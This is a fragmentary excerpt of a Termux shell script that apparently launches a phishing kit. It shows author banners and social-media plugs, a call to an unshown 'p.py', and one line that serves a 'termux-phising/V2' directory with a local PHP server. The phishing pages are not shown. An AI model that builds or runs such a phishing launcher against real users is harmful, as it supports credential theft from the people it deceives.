...
echo $pur"author @dickylesmana_"
echo $pur"Follow Github https://github.com/dickylesmana"
python2 p.py
clear
...
toilet -f term "           •   •   •" | lolcat
toilet -f term "             •       •" | lolcat
echo $i "v.1 author </DICKY LESMANA>"
...
php -S localhost:8080 -t /data/data/com.termux/files/home/termux-phising/V2
fi
...
sleep 2
echo $ku "FOLLOW IG : @dickylesmana"
echo
sleep 1
exit
fi
